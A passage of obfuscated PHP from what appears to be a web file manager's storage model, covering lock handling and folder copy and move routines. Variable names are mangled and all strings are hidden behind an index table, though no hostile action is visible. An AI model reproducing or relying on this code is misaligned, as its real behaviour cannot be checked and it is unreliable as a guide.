$this->_lockKey($ÏŒ’ÚÊÖ, 0); $¥´¿Í•Æ = array_reverse($this->parentLevelArray($Šè¿ƒ[$“‹Å²ÑĞ[512]])); foreach ($¥´¿Í•Æ as $Êƒ£Ô¡™) { $ÏŒ’ÚÊÖ = $àò€Ó¶È . $“‹Å²ÑĞ[549] . $Êƒ£Ô¡™; if (CacheLock::lockGet($“‹Å²ÑĞ[550] . $ÏŒ’ÚÊÖ)) { $Šè¿ƒ = $this->sourceInfo($Êƒ£Ô¡™); CacheLock::setErrorMsg($“‹Å²ÑĞ[159] . htmlspecialchars($Šè¿ƒ[$“‹Å²ÑĞ[32]]) . $“‹Å²ÑĞ[527] . $¦¤œ×Ÿƒ); $this->_lockKey($ÏŒ’ÚÊÖ, 1); $this->_lockKey($ÏŒ’ÚÊÖ, 0); } } } private function _lockCheckEnd($ÃüŞÅ¿, $‚ ¦‘¤¥) { $ÜÊ“…ç =& $_SERVER[ì…™Î¶Ï]; $á¼ÎÑİã = $ÃüŞÅ¿ . $ÜÊ“…ç[10] . $‚ ¦‘¤¥; CacheLock::setErrorMsg($ÜÊ“…ç[373]); if (!isset($this->_lockTimeStart[$á¼ÎÑİã])) { return; } $¿õ¸÷ˆ = timeFloat() - $this->_lockTimeStart[$á¼ÎÑİã]; unset($this->_lockTimeStart[$á¼ÎÑİã]); if ($¿õ¸÷ˆ > 0.5) { unset(self::$cacheSourceInfo[$ÜÊ“…ç[449] . $‚ ¦‘¤¥]); } $’ıˆ£ÙÅ = $this->sourceInfo($‚ ¦‘¤¥); if (!$’ıˆ£ÙÅ) { show_json(LNG($ÜÊ“…ç[106]), !1); } } private function _lockParent($Éİåä¹æ, $Ö½·±’, $Í¢ŒÃæÉ) { if (!$this->autoLockSet) { return; } $²›ùá‰Ú = $this->sourceInfo($Éİåä¹æ); if (!is_array($²›ùá‰Ú)) { return; } $ŒÂı’úÉ = array_reverse($this->parentLevelArray($²›ùá‰Ú[$_SERVER[ì…™Î¶Ï][512]])); foreach ($ŒÂı’úÉ as $æŒµÑƒÉ) { $this->_lockEvent($æŒµÑƒÉ, $Ö½·±’, $Í¢ŒÃæÉ); } } private function _lockEvent($å¾„Õá, $Ğ¶—¸ªó, $§·®…üÏ) { $İÉ‡õÓ =& $_SERVER[ì…™Î¶Ï]; if (!$this->autoLockSet) { return; } foreach ($Ğ¶—¸ªó as $Ë¢ñïê“) { $×Î–Ñµ = $Ë¢ñïê“ . $İÉ‡õÓ[10] . $å¾„Õá; if ($§·®…üÏ && CacheLock::lockGet($İÉ‡õÓ[550] . $×Î–Ñµ)) { continue; } $this->_lockKey($×Î–Ñµ, $§·®…üÏ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($•èÂ»Øİ, $„¸ˆ¨½Î = 1) { $Ä¤ ›‘È = $_SERVER[ì…™Î¶Ï][550] . md5($•èÂ»Øİ); if ($„¸ˆ¨½Î) { if (isset(self::$_lockItemArr[$Ä¤ ›‘È])) { return; } self::$_lockItemArr[$Ä¤ ›‘È] = 1; CacheLock::lock($Ä¤ ›‘È, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$Ä¤ ›‘È])) { return; } unset(self::$_lockItemArr[$Ä¤ ›‘È]); CacheLock::unlock($Ä¤ ›‘È); } } public function isParentOf($‹Ä–ÅÄÈ, $óô½Í¦’) { $åî‰†¢° =& $_SERVER[ì…™Î¶Ï]; $¢ÃŠ«ôÔ = $this->sourceInfo($‹Ä–ÅÄÈ); $‡«´ú¨ã = $this->sourceInfo($óô½Í¦’); $òİ„–ä— = $¢ÃŠ«ôÔ[$åî‰†¢°[512]] . $¢ÃŠ«ôÔ[$åî‰†¢°[394]] . $åî‰†¢°[50]; $”È›º¼İ = $‡«´ú¨ã[$åî‰†¢°[512]] . $‡«´ú¨ã[$åî‰†¢°[394]] . $åî‰†¢°[50]; $ÃéÓ¯ùæ = strpos($”È›º¼İ, $òİ„–ä—) === 0; return $ÃéÓ¯ùæ; } private $targetIsDelete = 0; public function copy($º˜–‘õ‹, $¡ÌºŠñã, $•Ìß¡¢ú = REPEAT_REPLACE, $¢»œÓÎ = '') { $˜ŸøÔç€ =& $_SERVER[ì…™Î¶Ï]; $ƒªÀîÑˆ = $this->sourceInfo($º˜–‘õ‹); $›•Ë§òÇ = $this->sourceInfo($¡ÌºŠñã); if (!$ƒªÀîÑˆ || !$›•Ë§òÇ || $›•Ë§òÇ[$˜ŸøÔç€[402]] != $˜ŸøÔç€[89]) { return !1; } if ($this->isParentOf($º˜–‘õ‹, $¡ÌºŠñã)) { return !1; } $Öà¬×òµ = $¢»œÓÎ ? $¢»œÓÎ : $ƒªÀîÑˆ[$˜ŸøÔç€[32]]; $this->lockCopyStart($º˜–‘õ‹); $this->lockWriteStart($¡ÌºŠñã, $Öà¬×òµ); $ËÆ‹Æë‚ = array($˜ŸøÔç€[551] => array(), $˜ŸøÔç€[552] => array(), $˜ŸøÔç€[553] => array()); $this->targetIsDelete = intval($ƒªÀîÑˆ[$˜ŸøÔç€[422]]); $Ç¸í£…Ç = $this->fileNameExistCache($¡ÌºŠñã, $ƒªÀîÑˆ[$˜ŸøÔç€[32]]); $–…ŸÚ…ğ = $this->_copy($º˜–‘õ‹, $¡ÌºŠñã, $•Ìß¡¢ú, $ËÆ‹Æë‚, !0, $¢»œÓÎ); $this->_childrenListClear(); $this->lockCopyEnd($º˜–‘õ‹); $this->lockWriteEnd($¡ÌºŠñã, $Öà¬×òµ); if ($ƒªÀîÑˆ[$˜ŸøÔç€[402]] == $˜ŸøÔç€[89] && $Ç¸í£…Ç == $–…ŸÚ…ğ) { $this->folderSizeResetChildren($Ç¸í£…Ç); } Model($˜ŸøÔç€[554])->addAll($ËÆ‹Æë‚[$˜ŸøÔç€[552]], array(), !0); if ($Ç¸í£…Ç != $–…ŸÚ…ğ || $ƒªÀîÑˆ[$˜ŸøÔç€[402]] == $˜ŸøÔç€[89]) { Model($˜ŸøÔç€[555])->eventCopy($–…ŸÚ…ğ); } $this->saveAll($ËÆ‹Æë‚[$˜ŸøÔç€[553]]); Model($˜ŸøÔç€[192])->linkAdd($ËÆ‹Æë‚[$˜ŸøÔç€[551]]); $this->folderSizeReset($¡ÌºŠñã); $this->updateModifyTime($¡ÌºŠñã); return $–…ŸÚ…ğ; } private function _copy($Ô½ˆá— , $ÃÜñªº„, $şıÀÊ…, &$ßÄĞ¥ß‚, $”Ìå«ÄÅ, $¦„¦ÛâË = '') { $Ç‰Şµ¼Œ =& $_SERVER[ì…™Î¶Ï]; $øÜÆÍ‹Â = $this->sourceInfoCache($Ô½ˆá— ); $Ã¹ôßß† = $øÜÆÍ‹Â[$Ç‰Şµ¼Œ[402]] == $Ç‰Şµ¼Œ[89]; $ÂÏ”îåÚ = $¦„¦ÛâË ? $¦„¦ÛâË : $øÜÆÍ‹Â[$Ç‰Şµ¼Œ[32]]; $œÄ€Ë¶¦ = $this->fileNameExistCache($ÃÜñªº„, $ÂÏ”îåÚ); if ($”Ìå«ÄÅ) { $this->_childrenAllMake($Ô½ˆá— ); if ($Ã¹ôßß† && $œÄ€Ë¶¦) { $this->_childrenAllMake($œÄ€Ë¶¦); } } if (!$œÄ€Ë¶¦) { return $this->_copyCreate($Ô½ˆá— , $ÃÜñªº„, $ÂÏ”îåÚ, $ßÄĞ¥ß‚); } $¡ÄÃÅÑÁ = $œÄ€Ë¶¦; if ($Ã¹ôßß†) { if ($şıÀÊ… == REPEAT_RENAME_FOLDER) { $ÂÏ”îåÚ = $this->fileNameAutoCache($ÃÜñªº„, $ÂÏ”îåÚ, $şıÀÊ…, $Ã¹ôßß†); $¡ÄÃÅÑÁ = $this->_copyCreate($Ô½ˆá— , $ÃÜñªº„, $ÂÏ”îåÚ, $ßÄĞ¥ß‚); } else { $ ·£¹ú = $this->_childrenList($Ô½ˆá— ); foreach ($ ·£¹ú as $¦ï¤ÉÓ¡) { $this->_copy($¦ï¤ÉÓ¡[$Ç‰Şµ¼Œ[394]], $œÄ€Ë¶¦, $şıÀÊ…, $ßÄĞ¥ß‚, !1); } } } else { if ($şıÀÊ… == REPEAT_RENAME || $şıÀÊ… == REPEAT_RENAME_FOLDER) { $ÂÏ”îåÚ = $this->fileNameAutoCache($ÃÜñªº„, $ÂÏ”îåÚ, $şıÀÊ…, $Ã¹ôßß†); $¡ÄÃÅÑÁ = $this->_copyCreate($Ô½ˆá— , $ÃÜñªº„, $ÂÏ”îåÚ, $ßÄĞ¥ß‚); } else { if ($şıÀÊ… == REPEAT_REPLACE) { $ƒéííç = $this->sourceInfoCache($œÄ€Ë¶¦); $†³ë¦à = $this->fileHistory($ƒéííç, $øÜÆÍ‹Â[$Ç‰Şµ¼Œ[458]], $øÜÆÍ‹Â[$Ç‰Şµ¼Œ[80]]); if ($†³ë¦à) { $ßÄĞ¥ß‚[$Ç‰Şµ¼Œ[551]][] = $øÜÆÍ‹Â[$Ç‰Şµ¼Œ[458]]; } } else { if ($şıÀÊ… == REPEAT_SKIP) { } } } Hook::trigger($Ç‰Şµ¼Œ[556], array($Ç‰Şµ¼Œ[557], $øÜÆÍ‹Â, 0)); } return $¡ÄÃÅÑÁ; } private function _copyCreate($²ö±•Ò¦, $”õêĞôà, $§¶¯Æ‰, &$­•¾«Ô¾) { $á³‰½úî =& $_SERVER[ì…™Î¶Ï]; $—í ‹Òˆ = $this->sourceInfoCache($²ö±•Ò¦); $äò³¸¿¨ = $this->sourceInfoCache($”õêĞôà); $ø‹  ù« = $this->_makeItemData($—í ‹Òˆ, $äò³¸¿¨, $§¶¯Æ‰); Hook::trigger($á³‰½úî[558], $ø‹  ù«); Hook::trigger($á³‰½úî[559], array($á³‰½úî[560], $ø‹  ù«, 0)); $ĞñÁ‚¦ı = $this->add($ø‹  ù«); $çÍôŸ£· = array($á³‰½úî[394] => $ĞñÁ‚¦ı, $á³‰½úî[32] => $§¶¯Æ‰); $this->_copyApplyMeta($çÍôŸ£·, $­•¾«Ô¾); if ($—í ‹Òˆ[$á³‰½úî[402]] != $á³‰½úî[89]) { $­•¾«Ô¾[$á³‰½úî[551]][] = $—í ‹Òˆ[$á³‰½úî[458]]; return $ĞñÁ‚¦ı; } $ø«£êã½ = array(); $äú‚…¾± = array(); $this->_childrenListAll($²ö±•Ò¦, $ø«£êã½); $÷ÔŞ¾ÕÎ = count($ø«£êã½); if ($÷ÔŞ¾ÕÎ == 0) { return $ĞñÁ‚¦ı; } $º¬ºæ½ = $this->sourceInfo($ĞñÁ‚¦ı); foreach ($ø«£êã½ as $ÚÆ¸¤) { $âş”¢Ãõ = $this->_makeItemData($ÚÆ¸¤, $º¬ºæ½, $ÚÆ¸¤[$á³‰½úî[32]]); $âş”¢Ãõ[$á³‰½úî[512]] = $ÚÆ¸¤[$á³‰½úî[512]]; $äú‚…¾±[] = $âş”¢Ãõ; } $this->chunkEventSet($á³‰½úî[561], array($á³‰½úî[562], $ø‹  ù«, $÷ÔŞ¾ÕÎ)); $this->addAll($äú‚…¾±, array(), !1); $Œ¿ëÆß³ = $this->where(array($á³‰½úî[489] => $ĞñÁ‚¦ı))->select(); $ˆı—Èéù = $this->_childrenMakeRelation($ø«£êã½, $Œ¿ëÆß³); $ˆı—Èéù[$²ö±•Ò¦] = $ĞñÁ‚¦ı; $´ğ¾®œ‘ = array(); $¼ù¾ğ« = array(); foreach ($Œ¿ëÆß³ as $ÚÆ¸¤) { $ÖÄˆçì† = $ÚÆ¸¤[$á³‰½úî[394]]; $Õˆìó¨‘ = $this->_childrenMatch($ˆı—Èéù, $ÚÆ¸¤, $º¬ºæ½); $´ğ¾®œ‘[] = array($á³‰½úî[394], $ÖÄˆçì†, $á³‰½úî[489], $Õˆìó¨‘[$á³‰½úî[489]]); $¼ù¾ğ«[] = array($á³‰½úî[394], $ÖÄˆçì†, $á³‰½úî[512], $Õˆìó¨‘[$á³‰½úî[512]]); $this->_copyApplyMeta($ÚÆ¸¤, $­•¾«Ô¾); if ($ÚÆ¸¤[$á³‰½úî[402]] != $á³‰½úî[89]) { $­•¾«Ô¾[$á³‰½úî[551]][] = $ÚÆ¸¤[$á³‰½úî[458]]; } } $this->chunkEventSet($á³‰½úî[563], array($á³‰½úî[564], $ø‹  ù«, $÷ÔŞ¾ÕÎ)); $this->saveAll($´ğ¾®œ‘); $this->chunkEventSet($á³‰½úî[565], array($á³‰½úî[566], $ø‹  ù«, $÷ÔŞ¾ÕÎ)); $this->saveAll($¼ù¾ğ«); return $ĞñÁ‚¦ı; } private function _childrenMakeRelation($›ÁÒ¦ìë, $ç€¡ØÚÈ) { $÷‚ğåœ± =& $_SERVER[ì…™Î¶Ï]; $¢•ÕĞÀ³ = array(); $ŒÆË­¼í = array(); foreach ($›ÁÒ¦ìë as $äÚÀúïû) { $ÍñÏ°Î = $äÚÀúïû[$÷‚ğåœ±[32]] . $÷‚ğåœ±[8] . $äÚÀúïû[$÷‚ğåœ±[512]]; $¢•ÕĞÀ³[$ÍñÏ°Î] = $äÚÀúïû[$÷‚ğåœ±[394]]; } foreach ($ç€¡ØÚÈ as $äÚÀúïû) { $ÍñÏ°Î = $äÚÀúïû[$÷‚ğåœ±[32]] . $÷‚ğåœ±[8] . $äÚÀúïû[$÷‚ğåœ±[512]]; $öË˜¸Ş = $¢•ÕĞÀ³[$ÍñÏ°Î]; $ŒÆË­¼í[$öË˜¸Ş] = $äÚÀúïû[$÷‚ğåœ±[394]]; } return $ŒÆË­¼í; } private function _childrenMatch($›ËéèÎõ, $¯˜Ú™úä, $¤ÒÍåÑ¼) { $ã¹Û¡ÈÕ =& $_SERVER[ì…™Î¶Ï]; $Í¡ÈäÍŞ = $¤ÒÍåÑ¼[$ã¹Û¡ÈÕ[512]]; $à¥–Å÷ = $this->parentLevelArray($¯˜Ú™úä[$ã¹Û¡ÈÕ[512]]); foreach ($à¥–Å÷ as $—ïÙ´Öš) { if (isset($›ËéèÎõ[$—ïÙ´Öš])) { $Í¡ÈäÍŞ .= $›ËéèÎõ[$—ïÙ´Öš] . $ã¹Û¡ÈÕ[567]; } } $Í¡ÈäÍŞ = rtrim($Í¡ÈäÍŞ, $ã¹Û¡ÈÕ[50]) . $ã¹Û¡ÈÕ[50]; $ê»š¸´„ = $this->parentLevelArray($Í¡ÈäÍŞ); $ä©ªÔä™ = $ê»š¸´„[count($ê»š¸´„) - 1]; return array($ã¹Û¡ÈÕ[489] => $ä©ªÔä™, $ã¹Û¡ÈÕ[512] => $Í¡ÈäÍŞ); } private function _makeItemData($ç•Š…ì©, $í‰•ÉÆÙ, $Â÷¼€÷›) { $óå‘†³ =& $_SERVER[ì…™Î¶Ï]; $°éÂ‰ŒŸ = array($óå‘†³[568] => $ç•Š…ì©[$óå‘†³[402]], $óå‘†³[412] => $Â÷¼€÷›, $óå‘†³[569] => $ç•Š…ì©[$óå‘†³[404]] ? $ç•Š…ì©[$óå‘†³[404]] : $óå‘†³[12], $óå‘†³[459] => $ç•Š…ì©[$óå‘†³[458]] ? $ç•Š…ì©[$óå‘†³[458]] : 0, $óå‘†³[570] => $ç•Š…ì©[$óå‘†³[80]] ? $ç•Š…ì©[$óå‘†³[80]] : 0, $óå‘†³[571] => intval($í‰•ÉÆÙ[$óå‘†³[403]]), $óå‘†³[572] => intval($í‰•ÉÆÙ[$óå‘†³[495]]), $óå‘†³[573] => intval(USER_ID), $óå‘†³[574] => intval(USER_ID), $óå‘†³[393] => intval($í‰•ÉÆÙ[$óå‘†³[394]]), $óå‘†³[575] => $í‰•ÉÆÙ[$óå‘†³[512]] . $í‰•ÉÆÙ[$óå‘†³[394]] . $óå‘†³[50], $óå‘†³[416] => $ç•Š…ì©[$óå‘†³[86]] ? $ç•Š…ì©[$óå‘†³[86]] : time(), $óå‘†³[421] => 0, $óå‘†³[576] => $óå‘†³[12]); return $°éÂ‰ŒŸ; } private function _copyApplyMeta($¢½Á¤ë, &$Ï÷Ê´ù) { $ø¿Æ¯² =& $_SERVER[ì…™Î¶Ï]; $Ç«à˜Œ÷ = $¢½Á¤ë[$ø¿Æ¯²[394]]; $¼”¶Ò× = $¢½Á¤ë[$ø¿Æ¯²[32]]; if (!isset($¢½Á¤ë[$ø¿Æ¯²[577]]) || !$¢½Á¤ë[$ø¿Æ¯²[577]] || $¢½Á¤ë[$ø¿Æ¯²[577]] == $ø¿Æ¯²[190]) { $Ï÷Ê´ù[$ø¿Æ¯²[553]][] = array($ø¿Æ¯²[394], $Ç«à˜Œ÷, $ø¿Æ¯²[577], short_id($Ç«à˜Œ÷)); } if (Input::check($¼”¶Ò×, $ø¿Æ¯²[578])) { $Ï÷Ê´ù[$ø¿Æ¯²[552]][] = array($ø¿Æ¯²[394] => $Ç«à˜Œ÷, $ø¿Æ¯²[95] => $ø¿Æ¯²[455], $ø¿Æ¯²[369] => str_replace($ø¿Æ¯²[53], $ø¿Æ¯²[12], Pinyin::get($¼”¶Ò×))); $Ï÷Ê´ù[$ø¿Æ¯²[552]][] = array($ø¿Æ¯²[394] => $Ç«à˜Œ÷, $ø¿Æ¯²[95] => $ø¿Æ¯²[454], $ø¿Æ¯²[369] => Pinyin::get($¼”¶Ò×, $ø¿Æ¯²[579])); } $Ï÷Ê´ù[$ø¿Æ¯²[552]][] = array($ø¿Æ¯²[394] => $Ç«à˜Œ÷, $ø¿Æ¯²[95] => $ø¿Æ¯²[433], $ø¿Æ¯²[369] => KodSort::makeStr($¼”¶Ò×)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Á¾Í‘æÒ) { $ÂŠğ±­ =& $_SERVER[ì…™Î¶Ï]; $ßÈ¼ÀŸ‰ = $this->sourceInfo($Á¾Í‘æÒ); $‹Ê¿ŸÑø = $ÂŠğ±­[580]; $•ƒæÆ‰ = array($ÂŠğ±­[512] => array($ÂŠğ±­[535], $ßÈ¼ÀŸ‰[$ÂŠğ±­[512]] . $Á¾Í‘æÒ . $ÂŠğ±­[536]), $ÂŠğ±­[422] => $this->targetIsDelete); $õóí¾£ = $this->field($‹Ê¿ŸÑø)->where($•ƒæÆ‰)->select(); if (!$õóí¾£) { return; } $õóí¾£ = array_to_keyvalue($õóí¾£, $ÂŠğ±­[394]); foreach ($õóí¾£ as $İœ…Ù¿) { $‹·÷×›ı = $İœ…Ù¿[$ÂŠğ±­[489]]; $Á¾Í‘æÒ = $İœ…Ù¿[$ÂŠğ±­[394]]; if (!isset($this->_childrenListCache[$Á¾Í‘æÒ]) && $İœ…Ù¿[$ÂŠğ±­[402]] == $ÂŠğ±­[89]) { $this->_childrenListCache[$Á¾Í‘æÒ] = array(); } if (!isset($this->_childrenListCache[$‹·÷×›ı])) { $this->_childrenListCache[$‹·÷×›ı] = array(); } $this->_childrenListCache[$‹·÷×›ı][$Á¾Í‘æÒ] = $İœ…Ù¿; $this->_childrenItemCache[$Á¾Í‘æÒ] = $İœ…Ù¿; } } private function _childrenListAll($§‡Éğèö, &$£¤®‰´) { $Á½—Şˆ± =& $_SERVER[ì…™Î¶Ï]; if (!isset($this->_childrenListCache[$§‡Éğèö])) { return; } $°ëâ‘Ê• = $this->_childrenListCache[$§‡Éğèö]; foreach ($°ëâ‘Ê• as $ŞÌ‚²ë => $·ñÀÓ•ú) { $£¤®‰´[$ŞÌ‚²ë] = $·ñÀÓ•ú; if ($·ñÀÓ•ú[$Á½—Şˆ±[402]] == $Á½—Şˆ±[89]) { $this->_childrenListAll($ŞÌ‚²ë, $£¤®‰´); } } } private function sourceInfoCache($ùÛ¼€æß) { if (isset($this->_childrenItemCache[$ùÛ¼€æß])) { return $this->_childrenItemCache[$ùÛ¼€æß]; } return $this->sourceInfo($ùÛ¼€æß); } private function _childrenList($Ä†óûÆâ) { if (isset($this->_childrenListCache[$Ä†óûÆâ])) { return $this->_childrenListCache[$Ä†óûÆâ]; } return $this->_childrenListSelect($Ä†óûÆâ); } private function _childrenListSelect($øµª‘ê’) { $óØ‰¸Šˆ =& $_SERVER[ì…™Î¶Ï]; $ ğ¨¦ÚÏ = array($óØ‰¸Šˆ[489] => $øµª‘ê’, $óØ‰¸Šˆ[422] => $this->targetIsDelete); $ˆÄäáÅ‰ = $this->where($ ğ¨¦ÚÏ)->select(); $ˆÄäáÅ‰ = $ˆÄäáÅ‰ ? $ˆÄäáÅ‰ : array(); $şÛ”ÄÂ› = array_to_keyvalue($ˆÄäáÅ‰, $óØ‰¸Šˆ[394]); $this->_childrenListCache[$øµª‘ê’] = $şÛ”ÄÂ›; foreach ($şÛ”ÄÂ› as $øµª‘ê’ => $À·¶–â) { $this->_childrenItemCache[$øµª‘ê’] = $À·¶–â; } return $şÛ”ÄÂ›; } private function fileNameExistCache($Ç§µ“•, $¯ªû) { $ĞÔöÀ =& $_SERVER[ì…™Î¶Ï]; $¯ªû = strtolower($¯ªû); $ÕÀëØ“÷ = $this->_childrenList($Ç§µ“•); foreach ($ÕÀëØ“÷ as $¦¦¢¹ŞÇ) { if ($¯ªû == strtolower($¦¦¢¹ŞÇ[$ĞÔöÀ[32]])) { return $¦¦¢¹ŞÇ[$ĞÔöÀ[394]]; } } return !1; } private function fileNameAutoCache($¬õÓ¨¤Ê, $ı™Ê­Í, $ÖË„à‰å, $‹’èÆ­à) { $ç¶ûìôÅ =& $_SERVER[ì…™Î¶Ï]; $ê ×Æ¡œ = $this->_childrenList($¬õÓ¨¤Ê); $Ñßêªá› = array_to_keyvalue($ê ×Æ¡œ, $ç¶ûìôÅ[12], $ç¶ûìôÅ[32]); return $this->fileNameAutoGet($Ñßêªá›, $ı™Ê­Í, $ÖË„à‰å, $‹’èÆ­à); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($È°ôìµÓ, $Úˆâ“½·, $áî·Å‚ó = REPEAT_REPLACE, $ŸŞ±å…§ = '') { $ìëÍ½Ü” =& $_SERVER[ì…™Î¶Ï]; $—Šşì = $this->sourceInfo($È°ôìµÓ); $¸ø³õ½Ï = $this->sourceInfo($Úˆâ“½·); if ($—Šşì[$ìëÍ½Ü”[489]] == $¸ø³õ½Ï[$ìëÍ½Ü”[394]]) { if ($—Šşì[$ìëÍ½Ü”[422]] == $ìëÍ½Ü”[89]) { Model($ìëÍ½Ü”[420])->restore(array($È°ôìµÓ)); } if (!$ŸŞ±å…§ || $ŸŞ±å…§ == $—Šşì[$ìëÍ½Ü”[32]]) { return $È°ôìµÓ; } } $€ƒÌÚ” = $this->pathInfoMore($È°ôìµÓ); if ($this->isParentOf($È°ôìµÓ, $Úˆâ“½·)) { return !1; } if (!$—Šşì || !$¸ø³õ½Ï || $¸ø³õ½Ï[$ìëÍ½Ü”[402]] != $ìëÍ½Ü”[89]) { return !1; } Hook::trigger($ìëÍ½Ü”[581], $€ƒÌÚ”); $this->targetIsDelete = intval($—Šşì[$ìëÍ½Ü”[422]]); if ($—Šşì[$ìëÍ½Ü”[489]] == $Úˆâ“½· && $ŸŞ±å…§ != $—Šşì[$ìëÍ½Ü”[32]]) { $´µŠñÍ‡ = $this->fileNameExist($Úˆâ“½·, $ŸŞ±å…§); if ($´µŠñÍ‡ && $—Šşì[$ìëÍ½Ü”[402]] == $ìëÍ½Ü”[190]) { $Øóì·Ş– = $this->sourceInfo($´µŠñÍ‡); $êûöúÖ = $this->fileHistory($Øóì·Ş–, $—Šşì[$ìëÍ½Ü”[458]], $—Šşì[$ìëÍ½Ü”[80]]); if (!$êûöúÖ) { Model($ìëÍ½Ü”[461])->remove($—Šşì[$ìëÍ½Ü”[458]]); } $this->removeNow($È°ôìµÓ, !1); $this->folderSizeReset($Úˆâ“½·); Hook::trigger($ìëÍ½Ü”[582], $€ƒÌÚ”); return $´µŠñÍ‡; } } $ƒæïÍÒè = $ŸŞ±å…§ ? $ŸŞ±å…§ : $—Šşì[$ìëÍ½Ü”[32]]; $this->lockMoveStart($È°ôìµÓ); $this->lockWriteStart($Úˆâ“½·, $ƒæïÍÒè); $‡Ä†èÆï = array($ìëÍ½Ü”[551] => array(), $ìëÍ½Ü”[583] => !1); $this->clearShare($È°ôìµÓ, $Úˆâ“½·); $¬¿ÍËá™ = $this->fileNameExistCache($Úˆâ“½·, $—Šşì[$ìëÍ½Ü”[32]]); $öşø¥Í¿ = $this->_move($È°ôìµÓ, $Úˆâ“½·, $áî·Å‚ó, $‡Ä†èÆï, $ŸŞ±å…§); $this->sourceCacheClear(); if ($—Šşì[$ìëÍ½Ü”[402]] == $ìëÍ½Ü”[89] && $¬¿ÍËá™) { $this->folderSizeResetChildren($öşø¥Í¿); } Model($ìëÍ½Ü”[192])->linkAdd($‡Ä†èÆï[$ìëÍ½Ü”[551]]); if ($¬¿ÍËá™ && $‡Ä†èÆï[$ìëÍ½Ü”[583]]) { $this->removeNow($È°ôìµÓ, !1); } $this->lockMoveEnd($È°ôìµÓ); $this->lockWriteEnd($Úˆâ“½·, $ƒæïÍÒè); $this->folderSizeReset($—Šşì[$ìëÍ½Ü”[489]]); $this->folderSizeReset($Úˆâ“½·); $¤²„É¦ = array($—Šşì[$ìëÍ½Ü”[489]], $Úˆâ“½·); if ($—Šşì[$ìëÍ½Ü”[402]] == $ìëÍ½Ü”[89]) { $¤²„É¦[] = $È°ôìµÓ; } $this->updateModifyTime($¤²„É¦); Model($ìëÍ½Ü”[555])->eventMove($È°ôìµÓ, $—Šşì[$ìëÍ½Ü”[489]], $Úˆâ“½·); Hook::trigger($ìëÍ½Ü”[582], $€ƒÌÚ”); return $öşø¥Í¿; } private function _move($ËÂÛşóÜ, $¾ úÊ©, $û¨ìÒÜ¢, &$›íè´ÎÂ, $“œâŠ›ª = '') { $ÔĞ¢ =& $_SERVER[ì…™Î¶Ï]; $…»½åİú = $this->sourceInfo($ËÂÛşóÜ); $¸¥Çû²¢ = $…»½åİú[$ÔĞ¢[402]] == $ÔĞ¢[89]; $Åá¾ìÜÅ = $“œâŠ›ª ? $“œâŠ›ª : $…»½åİú[$ÔĞ¢[32]]; $©µóöò = $this->fileNameExistCache($¾ úÊ©, $Åá¾ìÜÅ); $this->lockMoveStart($ËÂÛşóÜ); $this->lockWriteStart($¾ úÊ©, $Åá¾ìÜÅ); if (!$©µóöò) { return $this->_moveForce($ËÂÛşóÜ, $¾ úÊ©, $Åá¾ìÜÅ); } $Êô†òÑ = $©µóöò; $’¡æúÌî = !1; if ($¸¥Çû²¢) { if ($û¨ìÒÜ¢ == REPEAT_RENAME_FOLDER) { $Åá¾ìÜÅ = $this->fileNameAuto($¾ úÊ©, $Åá¾ìÜÅ, $û¨ìÒÜ¢, $¸¥Çû²¢); $Êô†òÑ = $this->_moveForce($ËÂÛşóÜ, $¾ úÊ©, $Åá¾ìÜÅ); } else { if ($û¨ìÒÜ¢ == REPEAT_RENAME_FOLDER) { $û¨ìÒÜ¢ = REPEAT_RENAME; } $Éß©Î³ = $this->_childrenListSelect($ËÂÛşóÜ); foreach ($Éß©Î³ as $º…²úù) { $this->_move($º…²úù[$ÔĞ¢[394]], $©µóöò, $û¨ìÒÜ¢, $›íè´ÎÂ); } $’¡æúÌî = !0; } } else { if ($û¨ìÒÜ¢ == REPEAT_SKIP) { $’¡æúÌî = !0; } else { if ($û¨ìÒÜ¢ == REPEAT_RENAME || $û¨ìÒÜ¢ == REPEAT_RENAME_FOLDER) { $Åá¾ìÜÅ = $this->fileNameAuto($¾ úÊ©, $Åá¾ìÜÅ, $û¨ìÒÜ¢, $¸¥Çû²¢); $Êô†òÑ = $this->_moveForce($ËÂÛşóÜ, $¾ úÊ©, $Åá¾ìÜÅ); } else { if ($û¨ìÒÜ¢ == REPEAT_REPLACE) { $¸º¼óİÓ = $this->sourceInfoCache($©µóöò); $µœøà”Ô = $this->fileHistory($¸º¼óİÓ, $…»½åİú[$ÔĞ¢[458]], $…»½åİú[$ÔĞ¢[80]]); $’¡æúÌî = !0; if ($µœøà”Ô) { $›íè´ÎÂ[$ÔĞ¢[551]][] = $…»½åİú[$ÔĞ¢[458]]; } } } } } if ($’¡æúÌî && !$›íè´ÎÂ[$ÔĞ¢[583]]) { $›íè´ÎÂ[$ÔĞ¢[583]] = !0; } return $Êô†òÑ; } private function _moveForce($Ë­ğ¸è, $ÀÜßªèØ, $›¹°á†) { $ÎŸŞº… =& $_SERVER[ì…™Î¶Ï]; $ÑÀ¯íÒ” = $this->sourceInfo($Ë­ğ¸è); $ß°ó¦´ = $this->sourceInfo($ÀÜßªèØ); $£šËÁéù = $ÑÀ¯íÒ”[$ÎŸŞº…[402]] == $ÎŸŞº…[89]; $ó§µ•„û = array($ÎŸŞº…[393] => $ß°ó¦´[$ÎŸŞº…[394]], $ÎŸŞº…[575] => $ß°ó¦´[$ÎŸŞº…[512]] . $ß°ó¦´[$ÎŸŞº…[394]] . $ÎŸŞº…[50], $ÎŸŞº…[571] => $ß°ó¦´[$ÎŸŞº…[403]], $ÎŸŞº…[572] => $ß°ó¦´[$ÎŸŞº…[495]], $ÎŸŞº…[574] => USER_ID, $ÎŸŞº…[412] => $›¹°á†); $Í¡é©¨ì = $ÑÀ¯íÒ”[$ÎŸŞº…[403]] == SourceModel::TYPE_GROUP && $ß°ó¦´[$ÎŸŞº…[403]] == SourceModel::TYPE_GROUP && $ÑÀ¯íÒ”[$ÎŸŞº…[495]] == $ß°ó¦´[$ÎŸŞº…[495]]; if (!$Í¡é©¨ì && $this->moveClearAuth) { Model($ÎŸŞº…[493])->authClear($Ë­ğ¸è); } $ƒû¿Ğ’ƒ = $ÑÀ¯íÒ”[$ÎŸŞº…[422]] == $ÎŸŞº…[89] && $ß°ó¦´[$ÎŸŞº…[422]] != $ÎŸŞº…[89]; if ($ƒû¿Ğ’ƒ) { $ó§µ•„û[$ÎŸŞº…[421]] 